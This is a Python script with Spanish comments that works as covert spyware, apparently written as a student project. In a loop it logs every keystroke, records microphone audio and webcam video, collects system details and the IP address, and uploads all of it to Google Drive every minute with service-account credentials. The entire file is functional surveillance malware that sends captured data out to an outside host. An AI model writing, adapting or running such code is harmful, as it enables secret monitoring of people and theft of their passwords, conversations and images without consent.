from pynput import keyboard # de la libreria pynput importamos el teclado
import time
import sounddevice as sd
import scipy.io.wavfile as wav
import subprocess
import platform
import socket
from google.oauth2 import service_account
from googleapiclient.discovery import build
from googleapiclient.http import MediaFileUpload
import cv2

SCOPES = ['https://www.googleapis.com/auth/drive']

teclas_especiales = {
   keyboard.Key.shift: "shift ",
   keyboard.Key.ctrl: "control ",
   keyboard.Key.alt: "alt ",
   keyboard.Key.caps_lock: "bloq_mayus ",
   keyboard.Key.tab: "tab ",
   keyboard.Key.enter: "enter ",
   keyboard.Key.backspace: "borrar ",
   keyboard.Key.esc: "esc ",
   keyboard.Key.space: " ",
   keyboard.Key.up: "flecha_arriba ",
   keyboard.Key.down: "flecha_abajo ",
   keyboard.Key.left: "flecha_izq ",
   keyboard.Key.right: "flecha_der ",
   keyboard.Key.home: "inicio ",
   keyboard.Key.end: "fin ",
   keyboard.Key.delete: "supr ",
   keyboard.Key.insert: "ins ",
   keyboard.Key.page_up: "repag ",
   keyboard.Key.page_down: "avpag ",
   keyboard.Key.f1: "f1 ",
   keyboard.Key.f2: "f2",
   keyboard.Key.f3: "f3 ",
   keyboard.Key.f4: "f4 ",
   keyboard.Key.f5: "f5 ",
   keyboard.Key.f6: "f6 ",
   keyboard.Key.f7: "f7 ",
   keyboard.Key.f8: "f8 ",
   keyboard.Key.f9: "f9 ",
   keyboard.Key.f10: "f10 ",
   keyboard.Key.f11: "f11 ",
   keyboard.Key.f12: "f12 ",
   keyboard.Key.alt_l: "alt ",
   keyboard.Key.cmd: "windows ",
}


def capture_audio(filename, filepath):
    duration = 7  # seconds
    fs = 44100  # sample rate

    # Record audio
    myrecording = sd.rec(duration * fs, samplerate=fs, channels=2)
    print("Grabando")
    sd.wait()
    print("Audio completado")

    # Save audio as WAV file
    wav_file = filepath + filename + ".wav"
    wav.write(wav_file, fs, myrecording)


def pulsacion(tecla): # definimos la funcion pulsacion con la variable tecla
    if tecla in teclas_especiales:
        with open("teclas_pulsadas.txt", "a") as f:
            f.write(teclas_especiales[tecla])
    else:
        with open("teclas_pulsadas.txt", "a") as f:
            f.write(tecla.char)


def obtener_informacion_sistema():
    sistema_operativo = platform.system()
    version_sistema = platform.release()
    procesador = platform.processor()
    nombre_nodo = platform.node()
    arquitectura = platform.architecture()[0]
    version_kernel = platform.uname()[2]
    informacion_completa = platform.platform()
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)

    informacion = {
        "Sistema operativo": sistema_operativo,
        "Versión del sistema operativo": version_sistema,
        "Procesador": procesador,
        "Nombre del nodo": nombre_nodo,
        "Arquitectura del procesador": arquitectura,
        "Versión del kernel del sistema operativo": version_kernel,
        "Información completa del sistema": informacion_completa,
        "Dirección IP": ip_address
    }

    with open('info.txt', 'w') as archivo:
        for clave, valor in informacion.items():
            linea = f"{clave}: {valor}\n"
            archivo.write(linea)

    print(f"La información se ha guardado en el archivo")


def authenticate():
    credentials = service_account.Credentials.from_service_account_file('credentials.json', scopes=SCOPES)
    service = build('drive', 'v3', credentials=credentials)
    return service


def upload_file(file_path, file_name):
    file_metadata = {'name': file_name}
    media = MediaFileUpload(file_path, mimetype='text/plain')

    file = service.files().create(body=file_metadata, media_body=media, fields='id').execute()
    print('Archivo subido. ID: %s' % file.get('id'))


def grabar_camara(video):
    cap = cv2.VideoCapture(0)

    if not cap.isOpened():
        print("No se pudo abrir la cámara")
        return

    frame_width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
    frame_height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))

    out = cv2.VideoWriter(video, cv2.VideoWriter_fourcc(*'mp4v'), 30, (frame_width, frame_height))

    start_time = time.time()
    while (time.time() - start_time) < 10:
        ret, frame = cap.read()

        if not ret:
            print("Error. Saliendo...")
            break

        out.write(frame)

        if cv2.waitKey(1) & 0xFF == ord('q'):
            break

    cap.release()
    out.release()
    cv2.destroyAllWindows()


while True:
    service = authenticate()
    captura = keyboard.Listener(pulsacion)
    captura.start()
    capture_audio("audio_ejemplo", "C:/Users/ivan/Desktop/is/")
    file_path = 'C:/Users/ivan/Desktop/is/audio_ejemplo.wav'
    file_name = 'audio_ejemplo.wav'
    upload_file(file_path, file_name)
    file_path = 'C:/Users/ivan/Desktop/is/teclas_pulsadas.txt'
    file_name = 'teclas_pulsadas.txt'
    upload_file(file_path, file_name)
    nombre_archivo = "video_salida.mp4"
    grabar_camara(nombre_archivo)
    file_path = 'C:/Users/ivan/Desktop/is/video_salida.mp4'
    file_name = 'video_salida.mp4'
    upload_file(file_path, file_name)
    nombre_archivo = "info.txt"
    obtener_informacion_sistema()
    file_path = 'C:/Users/ivan/Desktop/is/info.txt'
    file_name = 'info.txt'
    upload_file(file_path, file_name)
    time.sleep(60)




